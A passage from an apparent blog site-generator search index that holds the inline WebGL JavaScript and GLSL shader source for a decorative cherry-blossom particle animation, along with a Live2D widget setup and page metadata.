setViewports() { renderSpec.setSize(gl.canvas.width, gl.canvas.height); gl.clearColor(0.2, 0.2, 0.5, 1.0); gl.viewport(0, 0, renderSpec.width, renderSpec.height); var rtfunc = function (rtname, rtw, rth) { var rt = renderSpec[rtname]; if(rt) deleteRenderTarget(rt); renderSpec[rtname] = createRenderTarget(rtw, rth); }; rtfunc('mainRT', renderSpec.width, renderSpec.height); rtfunc('wFullRT0', renderSpec.width, renderSpec.height); rtfunc('wFullRT1', renderSpec.width, renderSpec.height); rtfunc('wHalfRT0', renderSpec.halfWidth, renderSpec.halfHeight); rtfunc('wHalfRT1', renderSpec.halfWidth, renderSpec.halfHeight); } function render() { renderScene(); } var animating = true; function toggleAnimation(elm) { animating ^= true; if(animating) animate(); if(elm) { elm.innerHTML = animating? \"Stop\":\"Start\"; } } function stepAnimation() { if(!animating) animate(); } function animate() { var curdate = new Date(); timeInfo.elapsed = (curdate - timeInfo.start) / 1000.0; timeInfo.delta = (curdate - timeInfo.prev) / 1000.0; timeInfo.prev = curdate; if(animating) requestAnimationFrame(animate); render(); } function makeCanvasFullScreen(canvas) { var b = document.body; var d = document.documentElement; fullw = Math.max(b.clientWidth , b.scrollWidth, d.scrollWidth, d.clientWidth); fullh = Math.max(b.clientHeight , b.scrollHeight, d.scrollHeight, d.clientHeight); canvas.width = fullw; canvas.height = fullh; } window.addEventListener('load', function(e) { var canvas = document.getElementById(\"sakura\"); try { makeCanvasFullScreen(canvas); gl = canvas.getContext('experimental-webgl'); } catch(e) { alert(\"WebGL not supported.\" + e); console.error(e); return; } window.addEventListener('resize', onResize); setViewports(); createScene(); initScene(); timeInfo.start = new Date(); timeInfo.prev = timeInfo.start; animate(); }); //set window.requestAnimationFrame (function (w, r) { w['r'+r] = w['r'+r] || w['webkitR'+r] || w['mozR'+r] || w['msR'+r] || w['oR'+r] || function(c){ w.setTimeout(c, 1000 / 60); }; })(window, 'equestAnimationFrame');"},{"title":"tags","date":"2019-12-13T09:13:36.000Z","updated":"2020-07-16T08:19:50.710Z","comments":false,"path":"tags/index.html","permalink":"http://lingxin16.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-01-02T09:38:33.360Z","updated":"2020-01-02T09:38:22.921Z","comments":true,"path":"sakura/index/index.html","permalink":"http://lingxin16.github.io/sakura/index/index.html","excerpt":"","text":"送你一场樱花雨 canvas { padding:0; margin:0; position: absolute; z-index: -1; left:0px; } if ('addEventListener' in window) { window.addEventListener('load', function() { document.body.className = document.body.className.replace(/\\bis-loading\\b/, ''); }); document.body.className += (navigator.userAgent.match(/(MSIE|rv:11\\.0)/) ? ' is-ie' : ''); } uniform mat4 uProjection; uniform mat4 uModelview; uniform vec3 uResolution; uniform vec3 uOffset; uniform vec3 uDOF; //x:focus distance, y:focus radius, z:max radius uniform vec3 uFade; //x:start distance, y:half distance, z:near fade start attribute vec3 aPosition; attribute vec3 aEuler; attribute vec2 aMisc; //x:size, y:fade varying vec3 pposition; varying float psize; varying float palpha; varying float pdist; //varying mat3 rotMat; varying vec3 normX; varying vec3 normY; varying vec3 normZ; varying vec3 normal; varying float diffuse; varying float specular; varying float rstop; varying float distancefade; void main(void) { // Projection is based on vertical angle vec4 pos = uModelview * vec4(aPosition + uOffset, 1.0); gl_Position = uProjection * pos; gl_PointSize = aMisc.x * uProjection[1][1] / -pos.z * uResolution.y * 0.5; pposition = pos.xyz; psize = aMisc.x; pdist = length(pos.xyz); palpha = smoothstep(0.0, 1.0, (pdist - 0.1) / uFade.z); vec3 elrsn = sin(aEuler); vec3 elrcs = cos(aEuler); mat3 rotx = mat3( 1.0, 0.0, 0.0, 0.0, elrcs.x, elrsn.x, 0.0, -elrsn.x, elrcs.x ); mat3 roty = mat3( elrcs.y, 0.0, -elrsn.y, 0.0, 1.0, 0.0, elrsn.y, 0.0, elrcs.y ); mat3 rotz = mat3( elrcs.z, elrsn.z, 0.0, -elrsn.z, elrcs.z, 0.0, 0.0, 0.0, 1.0 ); mat3 rotmat = rotx * roty * rotz; normal = rotmat[2]; mat3 trrotm = mat3( rotmat[0][0], rotmat[1][0], rotmat[2][0], rotmat[0][1], rotmat[1][1], rotmat[2][1], rotmat[0][2], rotmat[1][2], rotmat[2][2] ); normX = trrotm[0]; normY = trrotm[1]; normZ = trrotm[2]; const vec3 lit = vec3(0.6917144638660746, 0.6917144638660746, -0.20751433915982237); float tmpdfs = dot(lit, normal); if(tmpdfs < 0.0) { normal = -normal; tmpdfs = dot(lit, normal); } diffuse = 0.4 + tmpdfs; vec3 eyev = normalize(-pos.xyz); if(dot(eyev, normal) > 0.0) { vec3 hv = normalize(eyev + lit); specular = pow(max(dot(hv, normal), 0.0), 20.0); } else { specular = 0.0; } rstop = clamp((abs(pdist - uDOF.x) - uDOF.y) / uDOF.z, 0.0, 1.0); rstop = pow(rstop, 0.5); //-0.69315 = ln(0.5) distancefade = min(1.0, exp((uFade.x - pdist) * 0.69315 / uFade.y)); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform vec3 uDOF; //x:focus distance, y:focus radius, z:max radius uniform vec3 uFade; //x:start distance, y:half distance, z:near fade start const vec3 fadeCol = vec3(0.08, 0.03, 0.06); varying vec3 pposition; varying float psize; varying float palpha; varying float pdist; //varying mat3 rotMat; varying vec3 normX; varying vec3 normY; varying vec3 normZ; varying vec3 normal; varying float diffuse; varying float specular; varying float rstop; varying float distancefade; float ellipse(vec2 p, vec2 o, vec2 r) { vec2 lp = (p - o) / r; return length(lp) - 1.0; } void main(void) { vec3 p = vec3(gl_PointCoord - vec2(0.5, 0.5), 0.0) * 2.0; vec3 d = vec3(0.0, 0.0, -1.0); float nd = normZ.z; //dot(-normZ, d); if(abs(nd) < 0.0001) discard; float np = dot(normZ, p); vec3 tp = p + d * np / nd; vec2 coord = vec2(dot(normX, tp), dot(normY, tp)); //angle = 15 degree const float flwrsn = 0.258819045102521; const float flwrcs = 0.965925826289068; mat2 flwrm = mat2(flwrcs, -flwrsn, flwrsn, flwrcs); vec2 flwrp = vec2(abs(coord.x), coord.y) * flwrm; float r; if(flwrp.x < 0.0) { r = ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.36, 0.96) * 0.5); } else { r = ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.58, 0.96) * 0.5); } if(r > rstop) discard; vec3 col = mix(vec3(1.0, 0.8, 0.75), vec3(1.0, 0.9, 0.87), r); float grady = mix(0.0, 1.0, pow(coord.y * 0.5 + 0.5, 0.35)); col *= vec3(1.0, grady, grady); col *= mix(0.8, 1.0, pow(abs(coord.x), 0.3)); col = col * diffuse + specular; col = mix(fadeCol, col, distancefade); float alpha = (rstop > 0.001)? (0.5 - r / (rstop * 2.0)) : 1.0; alpha = smoothstep(0.0, 1.0, alpha) * palpha; gl_FragColor = vec4(col * 0.5, alpha); } uniform vec3 uResolution; attribute vec2 aPosition; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_Position = vec4(aPosition, 0.0, 1.0); texCoord = aPosition.xy * 0.5 + vec2(0.5, 0.5); screenCoord = aPosition.xy * vec2(uResolution.z, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform vec2 uTimes; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec3 col; float c; vec2 tmpv = texCoord * vec2(0.8, 1.0) - vec2(0.95, 1.0); c = exp(-pow(length(tmpv) * 1.8, 2.0)); col = mix(vec3(0.02, 0.0, 0.03), vec3(0.96, 0.98, 1.0) * 1.5, c); gl_FragColor = vec4(col * 0.5, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 col = texture2D(uSrc, texCoord); gl_FragColor = vec4(col.rgb * 2.0 - vec3(0.5), 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; uniform vec4 uBlurDir; //dir(x, y), stride(z, w) varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 col = texture2D(uSrc, texCoord); col = col + texture2D(uSrc, texCoord + uBlurDir.xy * uDelta); col = col + texture2D(uSrc, texCoord - uBlurDir.xy * uDelta); col = col + texture2D(uSrc, texCoord + (uBlurDir.xy + uBlurDir.zw) * uDelta); col = col + texture2D(uSrc, texCoord - (uBlurDir.xy + uBlurDir.zw) * uDelta); gl_FragColor = col / 5.0; } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_FragColor = texture2D(uSrc, texCoord); } uniform vec3 uResolution; attribute vec2 aPosition; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_Position = vec4(aPosition, 0.0, 1.0); texCoord = aPosition.xy * 0.5 + vec2(0.5, 0.5); screenCoord = aPosition.xy * vec2(uResolution.z, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform sampler2D uBloom; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 srccol = texture2D(uSrc, texCoord) * 2.0; vec4 bloomcol = texture2D(uBloom, texCoord); vec4 col; col = srccol + bloomcol * (vec4(1.0) + srccol); col *= smoothstep(1.0, 0.0, pow(length((texCoord - vec2(0.5)) * 2.0), 1.2) * 0.5); col = pow(col, vec4(0.45454545454545)); //(1.0 / 2.2) gl_FragColor = vec4(col.rgb, 1.0); gl_FragColor.a = 1.0; } L2Dwidget.init({\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginModelPath\":\"assets/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false}); // Utilities var Vector3 = {}; var Matrix44 = {}; Vector3.create = function(x, y, z) { return {'x':x, 'y':y, 'z':z}; }; Vector3.dot = function (v0, v1) { return v0.x * v1.x + v0.y * v1.y + v0.z * v1.z; }; Vector3.cross = function (v, v0, v1) { v.x = v0.y * v1.z - v0.z * v1.y; v.y = v0.z * v1.x - v0.x * v1.z; v.z = v0.x * v1.y - v0.y * v1.x; }; Vector3.normalize = function (v) { var l = v.x * v.x + v.y * v.y + v.z * v.z; if(l > 0.00001) { l = 1.0 / Math.sqrt(l); v.x *= l; v.y *= l; v.z *= l; } }; Vector3.arrayForm = function(v) { if(v.array) { v.array[0] = v.x; v.array[1] = v.y; v.array[2] = v.z; } else { v.array = new Float32Array([v.x, v.y, v.z]); } return v.array; }; Matrix44.createIdentity = function () { return new Float32Array([1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0]); }; Matrix44.loadProjection = function (m, aspect, vdeg, near, far) { var h = near * Math.tan(vdeg * Math.PI / 180.0 * 0.5) * 2.0; var w = h * aspect; m[0] = 2.0 * near / w; m[1] = 0.0; m[2] = 0.0; m[3] = 0.0; m[4] = 0.0; m[5] = 2.0 * near / h; m[6] = 0.0; m[7] = 0.0; m[8] = 0.0; m[9] = 0.0; m[10] = -(far + near) / (far - near); m[11] = -1.0; m[12] = 0.0; m[13] = 0.0; m[14] = -2.0 * far * near / (far - near); m[15] = 0.0; }; Matrix44.loadLookAt = function (m, vpos, vlook, vup) { var frontv = Vector3.create(vpos.x - vlook.x, vpos.y - vlook.y, vpos.z - vlook.z); Vector3.normalize(frontv); var sidev = Vector3.create(1.0, 0.0, 0.0); Vector3.cross(sidev, vup, frontv); Vector3.normalize(sidev); var topv = Vector3.create(1.0, 0.0, 0.0); Vector3.cross(topv, frontv, sidev); Vector3.normalize(topv); m[0] = sidev.x; m[1] = topv.x; m[2] = frontv.x; m[3] = 0.0; m[4] = sidev.y; m[5] = topv.y; m[6] = frontv.y; m[7] = 0.0; m[8] = sidev.z; m[9] = topv.z; m[10] = frontv.z; m[11] = 0.0; m[12] = -(vpos.x * m[0] + vpos.y * m[4] + vpos.z * m[8]); m[13] = -(vpos.x * m[1] + vpos.y * m[5] + vpos.z * m[9]); m[14] = -(vpos.x * m[2] + vpos.y * m[6] + vpos.z * m[10]); m[15] = 1.0; }; // var timeInfo = { 'start':0, 'prev':0, // Date 'delta':0, 'elapsed':0 // Number(sec) }; // var gl; var renderSpec = { 'width':0, 'height':0, 'aspect':1, 'array':new Float32Array(3), 'halfWidth':0, 'halfHeight':0, 'halfArray':new Float32Array(3) // and some render targets. see setViewport() }; renderSpec.setSize = function(w, h) { renderSpec.width = w; renderSpec.height = h; renderSpec.aspect = renderSpec.width / renderSpec.height; renderSpec.array[0] = renderSpec.width; renderSpec.array[1] = renderSpec.height; renderSpec.array[2] = renderSpec.aspect; renderSpec.halfWidth = Math.floor(w / 2); renderSpec.halfHeight = Math.floor(h / 2); renderSpec.halfArray[0] = renderSpec.halfWidth; renderSpec.halfArray[1] = renderSpec.halfHeight; renderSpec.halfArray[2] = renderSpec.halfWidth / renderSpec.halfHeight; }; function deleteRenderTarget(rt) { gl.deleteFramebuffer(rt.frameBuffer); gl.deleteRenderbuffer(rt.renderBuffer); gl.deleteTexture(rt.texture); } function createRenderTarget(w, h) { var ret = { 'width':w, 'height':h, 'sizeArray':new Float32Array([w, h, w / h]), 'dtxArray':new Float32Array([1.0 / w, 1.0 / h]) }; ret.frameBuffer = gl.createFramebuffer(); ret.renderBuffer = gl.createRenderbuffer(); ret.texture = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, ret.texture); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR); gl.bindFramebuffer(gl.FRAMEBUFFER, ret.frameBuffer); gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, ret.texture, 0); gl.bindRenderbuffer(gl.RENDERBUFFER, ret.renderBuffer); gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, w, h); gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.RENDERBUFFER, ret.renderBuffer); gl.bindTexture(gl.TEXTURE_2D, null); gl.bindRenderbuffer(gl.RENDERBUFFER, null); gl.bindFramebuffer(gl.FRAMEBUFFER, null); return ret; } function compileShader(shtype, shsrc) { var retsh = gl.createShader(shtype); gl.shaderSource(retsh, shsrc); gl.compileShader(retsh); if(!gl.getShaderParameter(retsh, gl.COMPILE_STATUS)) { var errlog = gl.getShaderInfoLog(retsh); gl.deleteShader(retsh); console.error(errlog); return null; } return retsh; } function createShader(vtxsrc, frgsrc, uniformlist, attrlist) { var vsh = compileShader(gl.VERTEX_SHADER, vtxsrc); var fsh = compileShader(gl.FRAGMENT_SHADER, frgsrc); if(vsh == null || fsh == null) { return null; } var prog = gl.createProgram(); gl.attachShader(prog, vsh); gl.attachShader(prog, fsh); gl.deleteShader(vsh); gl.deleteShader(fsh); gl.linkProgram(prog); if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) { var errlog = gl.getProgramInfoLog(prog); console.error(errlog); return null; } if(uniformlist) { prog.uniforms = {}; for(var i = 0; i < uniformlist.length; i++) { prog.uniforms[uniformlist[i]] = gl.getUniformLocation(prog, uniformlist[i]); } } if(attrlist) { prog.attributes = {}; for(var i = 0; i < attrlist.length; i++) { var attr = attrlist[i]; prog.attributes[attr] = gl.getAttribLocation(prog, attr); } } return prog; } function useShader(prog) { gl.useProgram(prog); for(var attr in prog.attributes) { gl.enableVertexAttribArray(prog.attributes[attr]);; } } function unuseShader(prog) { for(var attr in prog.attributes) { gl.disableVertexAttribArray(prog.attributes[attr]);; } gl.useProgram(null); } ///// var projection = { 'angle':60, 'nearfar':new Float32Array([0.1, 100.0]), 'matrix':Matrix44.createIdentity() }; var camera = { 'position':Vector3.create(0, 0, 100), 'lookat':Vector3.create(0, 0, 0), 'up':Vector3.create(0, 1, 0), 'dof':Vector3.create(10.0, 4.0, 8.0), 'matrix':Matrix44.createIdentity() }; var pointFlower = {}; var meshFlower = {}; var sceneStandBy = false; var BlossomParticle = function () { this.velocity = new Array(3); this.rotation = new Array(3); this.position = new Array(3); this.euler = new Array(3); this.size = 1.0; this.alpha = 1.0; this.zkey = 0.0; }; BlossomParticle.prototype.setVelocity = function (vx, vy, vz) { this.velocity[0] = vx; this.velocity[1] = vy; this.velocity[2] = vz; }; BlossomParticle.prototype.setRotation = function (rx, ry, rz) { this.rotation[0] = rx; this.rotation[1] = ry; this.rotation[2] = rz; }; BlossomParticle.prototype.setPosition = function (nx, ny, nz) { this.position[0] = nx; this.position[1] = ny; this.position[2] = nz; }; BlossomParticle.prototype.setEulerAngles = function (rx, ry, rz) { this.euler[0] = rx; this.euler[1] = ry; this.euler[2] = rz; }; BlossomParticle.prototype.setSize = function (s) { this.size = s; }; BlossomParticle.prototype.update = function (dt, et) { this.position[0] += this.velocity[0] * dt; this.position[1] += this.velocity[1] * dt; this.position[2] += this.velocity[2] * dt; this.euler[0] += this.rotation[0] * dt; this.euler[1] += this.rotation[1] * dt; this.euler[2] += this.rotation[2] * dt; }; function createPointFlowers() { // get point sizes var prm = gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE); renderSpec.pointSize = {'min':prm[0], 'max':prm[1]}; var vtxsrc = document.getElementById(\"sakura_point_vsh\").textContent; var frgsrc = document.getElementById(\"sakura_point_fsh\").textContent; pointFlower.program = createShader( vtxsrc, frgsrc, ['uProjection', 'uModelview', 'uResolution', 'uOffset', 'uDOF', 'uFade'], ['aPosition', 'aEuler', 'aMisc'] ); useShader(pointFlower.program); pointFlower.offset = new Float32Array([0.0, 0.0, 0.0]); pointFlower.fader = Vector3.create(0.0, 10.0, 0.0); // paramerters: velocity[3], rotate[3] pointFlower.numFlowers = 1600; pointFlower.particles = new Array(pointFlower.numFlowers); // vertex attributes {position[3], euler_xyz[3], size[1]} pointFlower.dataArray = new Float32Array(pointFlower.numFlowers * (3 + 3 + 2)); pointFlower.positionArrayOffset = 0; pointFlower.eulerArrayOffset = pointFlower.numFlowers * 3; pointFlower.miscArrayOffset = pointFlower.numFlowers * 6; pointFlower.buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer); gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(pointFlower.program); for(var i = 0; i < pointFlower.numFlowers; i++) { pointFlower.particles[i] = new BlossomParticle(); } } function initPointFlowers() { //area pointFlower.area = Vector3.create(20.0, 20.0, 20.0); pointFlower.area.x = pointFlower.area.y * renderSpec.aspect; pointFlower.fader.x = 10.0; //env fade start pointFlower.fader.y = pointFlower.area.z; //env fade half pointFlower.fader.z = 0.1; //near fade start //particles var PI2 = Math.PI * 2.0; var tmpv3 = Vector3.create(0, 0, 0); var tmpv = 0; var symmetryrand = function() {return (Math.random() * 2.0 - 1.0);}; for(var i = 0; i < pointFlower.numFlowers; i++) { var tmpprtcl = pointFlower.particles[i]; //velocity tmpv3.x = symmetryrand() * 0.3 + 0.8; tmpv3.y = symmetryrand() * 0.2 - 1.0; tmpv3.z = symmetryrand() * 0.3 + 0.5; Vector3.normalize(tmpv3); tmpv = 2.0 + Math.random() * 1.0; tmpprtcl.setVelocity(tmpv3.x * tmpv, tmpv3.y * tmpv, tmpv3.z * tmpv); //rotation tmpprtcl.setRotation( symmetryrand() * PI2 * 0.5, symmetryrand() * PI2 * 0.5, symmetryrand() * PI2 * 0.5 ); //position tmpprtcl.setPosition( symmetryrand() * pointFlower.area.x, symmetryrand() * pointFlower.area.y, symmetryrand() * pointFlower.area.z ); //euler tmpprtcl.setEulerAngles( Math.random() * Math.PI * 2.0, Math.random() * Math.PI * 2.0, Math.random() * Math.PI * 2.0 ); //size tmpprtcl.setSize(0.9 + Math.random() * 0.1); } } function renderPointFlowers() { //update var PI2 = Math.PI * 2.0; var limit = [pointFlower.area.x, pointFlower.area.y, pointFlower.area.z]; var repeatPos = function (prt, cmp, limit) { if(Math.abs(prt.position[cmp]) - prt.size * 0.5 > limit) { //out of area if(prt.position[cmp] > 0) { prt.position[cmp] -= limit * 2.0; } else { prt.position[cmp] += limit * 2.0; } } }; var repeatEuler = function (prt, cmp) { prt.euler[cmp] = prt.euler[cmp] % PI2; if(prt.euler[cmp] < 0.0) { prt.euler[cmp] += PI2; } }; for(var i = 0; i < pointFlower.numFlowers; i++) { var prtcl = pointFlower.particles[i]; prtcl.update(timeInfo.delta, timeInfo.elapsed); repeatPos(prtcl, 0, pointFlower.area.x); repeatPos(prtcl, 1, pointFlower.area.y); repeatPos(prtcl, 2, pointFlower.area.z); repeatEuler(prtcl, 0); repeatEuler(prtcl, 1); repeatEuler(prtcl, 2); prtcl.alpha = 1.0;//(pointFlower.area.z - prtcl.position[2]) * 0.5; prtcl.zkey = (camera.matrix[2] * prtcl.position[0] + camera.matrix[6] * prtcl.position[1] + camera.matrix[10] * prtcl.position[2] + camera.matrix[14]); } // sort pointFlower.particles.sort(function(p0, p1){return p0.zkey - p1.zkey;}); // update data var ipos = pointFlower.positionArrayOffset; var ieuler = pointFlower.eulerArrayOffset; var imisc = pointFlower.miscArrayOffset; for(var i = 0; i < pointFlower.numFlowers; i++) { var prtcl = pointFlower.particles[i]; pointFlower.dataArray[ipos] = prtcl.position[0]; pointFlower.dataArray[ipos + 1] = prtcl.position[1]; pointFlower.dataArray[ipos + 2] = prtcl.position[2]; ipos += 3; pointFlower.dataArray[ieuler] = prtcl.euler[0]; pointFlower.dataArray[ieuler + 1] = prtcl.euler[1]; pointFlower.dataArray[ieuler + 2] = prtcl.euler[2]; ieuler += 3; pointFlower.dataArray[imisc] = prtcl.size; pointFlower.dataArray[imisc + 1] = prtcl.alpha; imisc += 2; } //draw gl.enable(gl.BLEND); //gl.disable(gl.DEPTH_TEST); gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA); var prog = pointFlower.program; useShader(prog); gl.uniformMatrix4fv(prog.uniforms.uProjection, false, projection.matrix); gl.uniformMatrix4fv(prog.uniforms.uModelview, false, camera.matrix); gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array); gl.uniform3fv(prog.uniforms.uDOF, Vector3.arrayForm(camera.dof)); gl.uniform3fv(prog.uniforms.uFade, Vector3.arrayForm(pointFlower.fader)); gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer); gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW); gl.vertexAttribPointer(prog.attributes.aPosition, 3, gl.FLOAT, false, 0, pointFlower.positionArrayOffset * Float32Array.BYTES_PER_ELEMENT); gl.vertexAttribPointer(prog.attributes.aEuler, 3, gl.FLOAT, false, 0, pointFlower.eulerArrayOffset * Float32Array.BYTES_PER_ELEMENT); gl.vertexAttribPointer(prog.attributes.aMisc, 2, gl.FLOAT, false, 0, pointFlower.miscArrayOffset * Float32Array.BYTES_PER_ELEMENT); // doubler for(var i = 1; i < 2; i++) { var zpos = i * -2.0; pointFlower.offset[0] = pointFlower.area.x * -1.0; pointFlower.offset[1] = pointFlower.area.y * -1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * -1.0; pointFlower.offset[1] = pointFlower.area.y * 1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * 1.0; pointFlower.offset[1] = pointFlower.area.y * -1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * 1.0; pointFlower.offset[1] = pointFlower.area.y * 1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); } //main pointFlower.offset[0] = 0.0; pointFlower.offset[1] = 0.0; pointFlower.offset[2] = 0.0; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(prog); gl.enable(gl.DEPTH_TEST); gl.disable(gl.BLEND); } // effects //common util function createEffectProgram(vtxsrc, frgsrc, exunifs, exattrs) { var ret = {}; var unifs = ['uResolution', 'uSrc', 'uDelta']; if(exunifs) { unifs = unifs.concat(exunifs); } var attrs = ['aPosition']; if(exattrs) { attrs = attrs.concat(exattrs); } ret.program = createShader(vtxsrc, frgsrc, unifs, attrs); useShader(ret.program); ret.dataArray = new Float32Array([ -1.0, -1.0, 1.0, -1.0, -1.0, 1.0, 1.0, 1.0 ]); ret.buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, ret.buffer); gl.bufferData(gl.ARRAY_BUFFER, ret.dataArray, gl.STATIC_DRAW); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(ret.program); return ret; } // basic usage // useEffect(prog, srctex({'texture':texid, 'dtxArray':(f32)[dtx, dty]})); //basic initialize // gl.uniform**(...); //additional uniforms // drawEffect() // unuseEffect(prog) // TEXTURE0 makes src function useEffect(fxobj, srctex) { var prog = fxobj.program; useShader(prog); gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array); if(srctex != null) { gl.uniform2fv(prog.uniforms.uDelta, srctex.dtxArray); gl.uniform1i(prog.uniforms.uSrc, 0); gl.activeTexture(gl.TEXTURE0); gl.bindTexture(gl.TEXTURE_2D, srctex.texture); } } function drawEffect(fxobj) { gl.bindBuffer(gl.ARRAY_BUFFER, fxobj.buffer); gl.vertexAttribPointer(fxobj.program.attributes.aPosition, 2, gl.FLOAT, false, 0, 0); gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4); } function unuseEffect(fxobj) { unuseShader(fxobj.program); } var effectLib = {}; function createEffectLib() { var vtxsrc, frgsrc; //common var cmnvtxsrc = document.getElementById(\"fx_common_vsh\").textContent; //background frgsrc = document.getElementById(\"bg_fsh\").textContent; effectLib.sceneBg = createEffectProgram(cmnvtxsrc, frgsrc, ['uTimes'], null); // make brightpixels buffer frgsrc = document.getElementById(\"fx_brightbuf_fsh\").textContent; effectLib.mkBrightBuf = createEffectProgram(cmnvtxsrc, frgsrc, null, null); // direction blur frgsrc = document.getElementById(\"fx_dirblur_r4_fsh\").textContent; effectLib.dirBlur = createEffectProgram(cmnvtxsrc, frgsrc, ['uBlurDir'], null); //final composite vtxsrc = document.getElementById(\"pp_final_vsh\").textContent; frgsrc = document.getElementById(\"pp_final_fsh\").textContent; effectLib.finalComp = createEffectProgram(vtxsrc, frgsrc, ['uBloom'], null); } // background function createBackground() { //console.log(\"create background\"); } function initBackground() { //console.log(\"init background\"); } function renderBackground() { gl.disable(gl.DEPTH_TEST); useEffect(effectLib.sceneBg, null); gl.uniform2f(effectLib.sceneBg.program.uniforms.uTimes, timeInfo.elapsed, timeInfo.delta); drawEffect(effectLib.sceneBg); unuseEffect(effectLib.sceneBg); gl.enable(gl.DEPTH_TEST); } // post process var postProcess = {}; function createPostProcess() { //console.log(\"create post process\"); } function initPostProcess() { //console.log(\"init post process\"); } function renderPostProcess() { gl.enable(gl.TEXTURE_2D); gl.disable(gl.DEPTH_TEST); var bindRT = function (rt, isclear) { gl.bindFramebuffer(gl.FRAMEBUFFER, rt.frameBuffer); gl.viewport(0, 0, rt.width, rt.height); if(isclear) { gl.clearColor(0, 0, 0, 0); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); } }; //make bright buff bindRT(renderSpec.wHalfRT0, true); useEffect(effectLib.mkBrightBuf, renderSpec.mainRT); drawEffect(effectLib.mkBrightBuf); unuseEffect(effectLib.mkBrightBuf); // make bloom for(var i = 0; i < 2; i++) { var p = 1.5 + 1 * i; var s = 2.0 + 1 * i; bindRT(renderSpec.wHalfRT1, true); useEffect(effectLib.dirBlur, renderSpec.wHalfRT0); gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, p, 0.0, s, 0.0); drawEffect(effectLib.dirBlur); unuseEffect(effectLib.dirBlur); bindRT(renderSpec.wHalfRT0, true); useEffect(effectLib.dirBlur, renderSpec.wHalfRT1); gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, 0.0, p, 0.0, s); drawEffect(effectLib.dirBlur); unuseEffect(effectLib.dirBlur); } //display gl.bindFramebuffer(gl.FRAMEBUFFER, null); gl.viewport(0, 0, renderSpec.width, renderSpec.height); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); useEffect(effectLib.finalComp, renderSpec.mainRT); gl.uniform1i(effectLib.finalComp.program.uniforms.uBloom, 1); gl.activeTexture(gl.TEXTURE1); gl.bindTexture(gl.TEXTURE_2D, renderSpec.wHalfRT0.texture); drawEffect(effectLib.finalComp); unuseEffect(effectLib.finalComp); gl.enable(gl.DEPTH_TEST); } ///// var SceneEnv = {}; function createScene() { createEffectLib(); 